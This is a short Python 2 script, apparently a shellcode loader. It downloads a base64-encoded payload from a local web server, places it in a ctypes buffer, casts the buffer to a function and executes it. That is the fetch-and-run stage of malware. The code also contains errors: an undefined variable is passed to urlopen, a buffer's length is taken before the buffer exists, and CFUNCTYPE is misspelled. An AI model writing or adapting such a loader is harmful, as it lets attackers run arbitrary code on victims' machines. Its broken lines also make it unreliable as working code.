import urllib2
import ctypes
import base64

url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(r)

shellCode = base64.b64decode(response.read())

shellCodeBuffer = ctypes.create_string_buffer(shellCode, len(shellCodeBuffer))

shellCodeFunc = ctypes.cast(shellCodeBuffer, ctypes.CFUNTYPE(ctypes.c_void_p))

shellCodeFunc()
